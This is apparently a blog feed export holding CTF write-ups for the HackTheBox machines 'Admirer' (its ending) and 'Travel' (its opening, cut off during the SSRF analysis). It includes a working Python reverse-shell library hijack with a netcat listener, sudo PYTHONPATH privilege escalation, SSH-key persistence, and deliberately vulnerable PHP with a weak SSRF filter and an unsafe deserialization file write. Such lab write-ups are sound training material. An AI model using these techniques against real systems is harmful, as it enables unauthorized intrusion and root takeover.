variable which you can set to add additional directories where python will look for modules and packages. For most installations, you should not set these variables since they are not needed for Python to run. Python knows where to find its standard library.</p><p>The only reason to set PYTHONPATH is to maintain directories of custom Python libraries that you do not want to install in the global default location (i.e., the site-packages directory).</p><p><a href="https://docs.python.org/3/using/cmdline.html#envvar-PYTHONPATH">https://docs.python.org/3/using/cmdline.html#envvar-PYTHONPATH</a></p></blockquote><p>To put that in practice, first let’s write a very simple python script as <code>shutil</code> <code>make_archive</code> function to open a reverse shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_archive</span>(<span class="params">arg1, arg2, arg3</span>):</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&quot;10.10.10.10&quot;</span>, <span class="number">8585</span>))</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">    p = subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure><p>Let’s save it to a folder we control with <code>shutil.py</code> as name. I will use <code>/tmp/.hg8/shutil.py</code>.</p><p>Now we open our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>And finally we run the backup script as <code>root</code> while setting the <code>PYTHONPATH</code> environnement variable to point to our rogue library in <code>/tmp/.hg8/</code> first, then to the real lib directory to make sure the library used by our reverse shell can work properly:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">waldo@admirer:~$ sudo PYTHONPATH=/tmp/.hg8:/usr/lib/python3.5/ /opt/scripts/admin_tasks.sh 6</span><br><span class="line">waldo@admirer:~$</span><br></pre></td></tr></table></figure><p>And we get a new connection on our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.187:44040</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p>Let’s add our SSH key to <code>~/.ssh/authorized_keys</code> in order to get a proper shell: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /root/.ssh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAxxxx hg8@htb.htb&quot;</span> &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>And grab our flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa_htb root@admirer.htb</span><br><span class="line">Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">Last login: Wed Apr 29 11:07:00 2020</span><br><span class="line">root@admirer:~<span class="comment"># cat root.txt</span></span><br><span class="line">bxxxxxxxxxxxxxxxxxxx0</span><br></pre></td></tr></table></figure><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Easy Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> admirer </tag>
            
            <tag> enumeration </tag>
            
            <tag> adminer </tag>
            
            <tag> mysql local file read </tag>
            
            <tag> ftp </tag>
            
            <tag> python library overwrite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Travel</title>
      <link href="/posts/travel/"/>
      <url>/posts/travel/</url>
      
        <content type="html"><![CDATA[<img width="580" alt="travel-hackthebox" src="https://user-images.githubusercontent.com/9076747/83274122-9a75cb00-a1cd-11ea-8e44-a3d1de73447c.png"><p>Travel just retired on HackTheBox. It’s a hard difficulty Linux box. The box was really well designed but it’s the one that gives me the biggest headache so far. The path to user is really not obvious and require a lot of enumeration and stepping back, looking at the big picture to understand what’s going on behind the hood and how it can be exploited. This box doesn’t rely on common vulnerabilities but rather on little configuration and coding mistakes that allows you to chain vulnerability until you can obtain what you need. In the end it’s a though but awesome box that I really recommend. </p><p><strong>Tl;Dr:</strong> To get the user flag you first have to retrieve some php files code source from an open <code>git</code> repository. With information found in the source code you discover an SSRF vulnerability and an object deserialization vulnerability through <code>memcached</code>. Linking those two vulnerabilities we achieve arbitrary file write allowing us to create a web-shell. The web server runs in a Docker container and we have to explore to find a SQL backup file containing hashed password for <code>lynik-admin</code> user. Cracking the hash allow to use password to connect through SSH and get the user flag.<br>For the root flag you have to find the LDAP admin password in <code>.viminfo</code> cache file. Using this admin password it’s possible, using LDAP, to edit the permission of one user on the box to give him <code>root</code> access trough sudo. It’s also possible to edit its SSH key and account password, giving us full access to a privileged account and use it to get the root flag.</p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.189 traval.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$  nmap -sV -sT -sC travel.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> travel.htb (10.10.10.189)</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp  open  http     nginx 1.17.6</span><br><span class="line">|_http-title: Travel.HTB</span><br><span class="line">443/tcp open  ssl/http nginx 1.17.6</span><br><span class="line">|_http-title: Travel.HTB - SSL coming soon.</span><br><span class="line">| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK</span><br><span class="line">|_ Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 17.06 seconds</span><br></pre></td></tr></table></figure><p>We have a classical web app running on port 80, 443 and the SSH port 22 open.</p><p><code>nmap</code> gives us additional information about two subdomains: <code>blog.travel.htb</code> and <code>blog-dev.travel.htb</code>.</p><p>Opening <a href="http://travel.htb/">http://travel.htb</a> display a following page:</p><img width="1012" alt="travel homepage" src="https://user-images.githubusercontent.com/9076747/83331082-1f2b1c80-a294-11ea-89cc-beecf347e724.png"><p>Not much we can’t do from here… Let’s move on.</p><p>Opening <a href="https://travel.htb/">https://travel.htb</a> display a following page:</p><img width="1012" alt="travel https homepage" src="https://user-images.githubusercontent.com/9076747/83331099-44b82600-a294-11ea-8106-7376cb873716.png"><p>The port 443 seems quite empty aswell… Let’s take a look at the subdomains:</p><p>Opening <a href="http://blog-dev.travel.htb/">http://blog-dev.travel.htb</a> returns a <code>403 Forbidden</code> while <a href="http://blog.travel.htb/">http://blog.travel.htb</a> returns an actual blog:</p><img width="1012" alt="travel blog homepage" src="https://user-images.githubusercontent.com/9076747/83331292-87c6c900-a295-11ea-931f-0aea5b5461a1.png"><p>The blog is a Wordpress (<code>Powered by WordPress </code> in the footer) and it main and only feature seems to be the “Awesome RSS” reader:</p><blockquote><p>Welcome to our Travel Blog. Make sure to check out our new RSS feature coming fresh from our blog-dev team!</p></blockquote><p>The page display an RSS Reader with apparently nothing in particular:</p><img width="1012" alt="travel RSS feature" src="https://user-images.githubusercontent.com/9076747/83331326-c52b5680-a295-11ea-9798-be3fd6689868.png"><p>Let’s move on. First we can fire <code>gobuster</code> to see if it can find interesting directories. </p><p><code>http://blog.travel.htb</code> didn’t returned any interesting content, nothing more than common wordpress folder. <code>wpscan</code> didn’t find any vulnerability in the Wordpress version used nor in any plugins or themes.</p><h3 id="Git-Repository-Disclosure"><a href="#Git-Repository-Disclosure" class="headerlink" title="Git Repository Disclosure"></a>Git Repository Disclosure</h3><p>Upon running <code>gobuster</code> on <code>http://blog-dev.travel.htb</code> an interesting folder shows up:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://blog-dev.travel.htb/&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.git (Status: 301)</span><br></pre></td></tr></table></figure><p>Looks like someone accidentally let the project Git repository open and accessible. </p><p>If you are comfortable with Git inner-working, you are aware that Git will create a <code>.git</code> folder at the root of every projects it handle. This folder contains all the informations necessary for versioning the project, including all the information about commits, remote repository address, etc.<br>It also contains logs that stores the files commit history to be able to roll back to history at any moment.</p><p>Here is a good <a href="https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/">explanation</a> on how it works behind the hood.</p><p>Alright! So with the right <a href="https://github.com/internetwache/GitTools">tools</a> we should be able to easily dump the whole content of the repository.<br>Let’s use <code>GitTools</code> for this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ bash gitdumper.sh http://blog-dev.travel.htb/.git/ blog-dev-dump</span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"><span class="comment"># GitDumper is part of https://github.com/internetwache/GitTools</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Developed and maintained by @gehaxelt from @internetwache</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"></span><br><span class="line">[+] Downloaded: HEAD</span><br><span class="line">[-] Downloaded: objects/info/packs</span><br><span class="line">[+] Downloaded: description</span><br><span class="line">[+] Downloaded: config</span><br><span class="line">[+] Downloaded: COMMIT_EDITMSG</span><br><span class="line">[+] Downloaded: index</span><br><span class="line">[-] Downloaded: packed-refs</span><br><span class="line">[+] Downloaded: refs/heads/master</span><br><span class="line">[-] Downloaded: refs/remotes/origin/HEAD</span><br><span class="line">[-] Downloaded: refs/stash</span><br><span class="line">[+] Downloaded: logs/HEAD</span><br><span class="line">[+] Downloaded: logs/refs/heads/master</span><br><span class="line">[-] Downloaded: logs/refs/remotes/origin/HEAD</span><br><span class="line">[-] Downloaded: info/refs</span><br><span class="line">[+] Downloaded: info/exclude</span><br><span class="line">[+] Downloaded: objects/03/13850ae948d71767aff2cc8cc0f87a0feeef63</span><br><span class="line">[-] Downloaded: objects/00/00000000000000000000000000000000000000</span><br><span class="line">[+] Downloaded: objects/b0/2b083f68102c4d62c49ed3c99ccbb31632ae9f</span><br><span class="line">[+] Downloaded: objects/ed/116c7c7c51645f1e8a403bcec44873f74208e9</span><br><span class="line">[+] Downloaded: objects/2b/1869f5a2d50f0ede787af91b3ff376efb7b039</span><br><span class="line">[+] Downloaded: objects/30/b6f36ec80e8bc96451e47c49597fdd64cee2da</span><br></pre></td></tr></table></figure><p>Bingo! looks like we managed to access a few files here. Let’s now run <code>git reset</code> to get the file content:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ git <span class="built_in">log</span></span><br><span class="line">commit 0313850ae948d71767aff2cc8cc0f87a0feeef63 (HEAD -&gt; master)</span><br><span class="line">Author: jane &lt;jane@travel.htb&gt;</span><br><span class="line">Date:   Tue Apr 21 01:34:54 2020 -0700</span><br><span class="line"></span><br><span class="line">    moved to git</span><br><span class="line">    </span><br><span class="line">[hg8@archbook ~]$ git reset --hard</span><br><span class="line">HEAD is now at 0313850 moved to git</span><br><span class="line">hugo@archpen:/home/hugo/hackthebox/travel/blog-dev-dump git:(master) $ ls</span><br><span class="line">README.md  rss_template.php  template.php</span><br></pre></td></tr></table></figure><p>According to the <code>README.md</code> file this is an extension to show RSS inside a Wordpress page:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat README.md</span><br><span class="line"><span class="comment"># Rss Template Extension</span></span><br><span class="line"></span><br><span class="line">Allows rss-feeds to be shown on a custom wordpress page.</span><br><span class="line"></span><br><span class="line"><span class="comment">## Setup</span></span><br><span class="line"></span><br><span class="line">\ `git <span class="built_in">clone</span> https://github.com/WordPress/WordPress.git`</span><br><span class="line">* copy rss_template.php &amp; template.php to `wp-content/themes/twentytwenty`</span><br><span class="line">* create logs directory <span class="keyword">in</span> `wp-content/themes/twentytwenty`</span><br><span class="line">* create page <span class="keyword">in</span> backend and choose rss_template.php as theme</span><br><span class="line"></span><br><span class="line"><span class="comment">## Changelog</span></span><br><span class="line"></span><br><span class="line">- temporarily disabled cache compression</span><br><span class="line">- added additional security checks</span><br><span class="line">- added caching</span><br><span class="line">- added rss template</span><br><span class="line"></span><br><span class="line"><span class="comment">## ToDo</span></span><br><span class="line"></span><br><span class="line">- finish logging implementation% </span><br></pre></td></tr></table></figure><p>This is probably what is being used on the “Awesome RSS” page we found earlier on <code>http://blog.travel.htb/awesone-rss/</code>.</p><p>The <code>README.md</code> gives us additional information that might come useful later:</p><ul><li><code>rss_template.php</code> and <code>template.php</code> files we just found should be located in <code>wp-content/themes/twentytwenty</code>.</li><li>A <code>logs</code> folder exist at <code>wp-content/themes/twentytwenty/logs</code>.</li><li>The RSS have security checks, probably meaning it handle user input at some points.</li><li>Something get cached somewhere.</li></ul><p>With those information in mind let’s continue our investigations.</p><h3 id="RSS-Template"><a href="#RSS-Template" class="headerlink" title="RSS Template"></a>RSS Template</h3><p>Let’s take a deeper look at the two php files we recovered. First <code>rss_template.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Template Name: Awesome RSS</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;template.php&#x27;</span>);</span><br><span class="line">get_header();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;main <span class="class"><span class="keyword">class</span>=&quot;<span class="title">section</span>-<span class="title">inner</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"> <span class="title">function</span> <span class="title">get_feed</span>($<span class="title">url</span>)</span>&#123;</span><br><span class="line">     <span class="keyword">require_once</span> ABSPATH . <span class="string">&#x27;/wp-includes/class-simplepie.php&#x27;</span>;</span><br><span class="line">     <span class="variable">$simplepie</span> = <span class="literal">null</span>;</span><br><span class="line">     <span class="variable">$data</span> = url_get_contents(<span class="variable">$url</span>);</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$url</span>) &#123;</span><br><span class="line">         <span class="variable">$simplepie</span> = <span class="keyword">new</span> SimplePie();</span><br><span class="line">         <span class="variable">$simplepie</span>-&gt;set_cache_location(<span class="string">&#x27;memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_&#x27;</span>);</span><br><span class="line">         <span class="comment">//$simplepie-&gt;set_raw_data($data);</span></span><br><span class="line">         <span class="variable">$simplepie</span>-&gt;set_feed_url(<span class="variable">$url</span>);</span><br><span class="line">         <span class="variable">$simplepie</span>-&gt;init();</span><br><span class="line">         <span class="variable">$simplepie</span>-&gt;handle_content_type();</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$simplepie</span>-&gt;error) &#123;</span><br><span class="line">             error_log(<span class="variable">$simplepie</span>-&gt;error);</span><br><span class="line">             <span class="variable">$simplepie</span> = <span class="literal">null</span>;</span><br><span class="line">             <span class="variable">$failed</span> = <span class="literal">True</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$simplepie</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">     <span class="keyword">if</span>(strpos(<span class="variable">$url</span>, <span class="string">&quot;custom_feed_url&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">         <span class="variable">$tmp</span> = (explode(<span class="string">&quot;=&quot;</span>, <span class="variable">$url</span>));</span><br><span class="line">          <span class="variable">$url</span> = end(<span class="variable">$tmp</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="variable">$url</span> = <span class="string">&quot;http://www.travel.htb/newsfeed/customfeed.xml&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$feed</span> = get_feed(<span class="variable">$url</span>);</span><br><span class="line">[...]</span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line">&lt;/main&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">DEBUG</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">&#x27;debug.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> get_template_part( <span class="string">&#x27;template-parts/footer-menus-widgets&#x27;</span> ); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">get_footer();</span><br></pre></td></tr></table></figure><p>Alright so this file gives us a lot of informations on what going on. To resume:</p><ul><li>This is the template used at <code>http://blog.travel.htb/awesome-rss/</code>.</li><li>The RSS is parsed using a library named <code>SimplePie</code>.</li><li>Something seems to be cached (probably the feed content?) into a local instance of <code>memcached</code>.</li><li>It’s possible to provide a custom RSS feed link to the page using <code>custom_feed_url</code> parameter.</li><li>There is a <code>debug.php</code> file located at <code>wp-content/themes/twentytwenty/debug.php</code></li></ul><p>Let’s now take a look at <code>template.php</code> which get included in <code>rss_template.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> <span class="doctag">Todo:</span> finish logging implementation via TemplateHelper</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="comment">// this should be secure</span></span><br><span class="line">        <span class="variable">$tmpUrl</span> = urldecode(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$tmpUrl</span>, <span class="string">&quot;file://&quot;</span>) !== <span class="literal">false</span> <span class="keyword">or</span> strpos(<span class="variable">$tmpUrl</span>, <span class="string">&quot;@&quot;</span>) !== <span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;&lt;h2&gt;Hacking attempt prevented (LFI). Event has been logged.&lt;/h2&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$tmpUrl</span>, <span class="string">&quot;-o&quot;</span>) !== <span class="literal">false</span> <span class="keyword">or</span> strpos(<span class="variable">$tmpUrl</span>, <span class="string">&quot;-F&quot;</span>) !== <span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;&lt;h2&gt;Hacking attempt prevented (Command Injection). Event has been logged.&lt;/h2&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$tmp</span> = parse_url(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line">        <span class="comment">// preventing all localhost access</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$tmp</span> == <span class="string">&quot;localhost&quot;</span> <span class="keyword">or</span> <span class="variable">$tmp</span> == <span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$url</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">url_get_contents</span> (<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$url</span> = safe(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$url</span> = escapeshellarg(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$pl</span> = <span class="string">&quot;curl &quot;</span>.<span class="variable">$url</span>;</span><br><span class="line">        <span class="variable">$output</span> = shell_exec(<span class="variable">$pl</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TemplateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="keyword">string</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init(<span class="keyword">$this</span>-&gt;file, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="keyword">string</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">        file_put_contents(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/logs/&#x27;</span>.<span class="keyword">$this</span>-&gt;file, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The file is mainly used to retrieve remote RSS file using <code>curl</code>. In addition there is a few “security” check to make sure the parsing of custom RSS url doesn’t get abused. </p><p>Well now that’s a lot of informations. Let’s put everything together to see if we can progress.</p><h3 id="Blind-SSRF-With-Custom-RSS-Feed"><a href="#Blind-SSRF-With-Custom-RSS-Feed" class="headerlink" title="Blind SSRF With Custom RSS Feed"></a>Blind SSRF With Custom RSS Feed</h3><p>First thing I wanted to try was to check this <code>custom_feed_url</code> function.</p><p>Let’s create a valid RSS file and host it on our machine using Python server:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 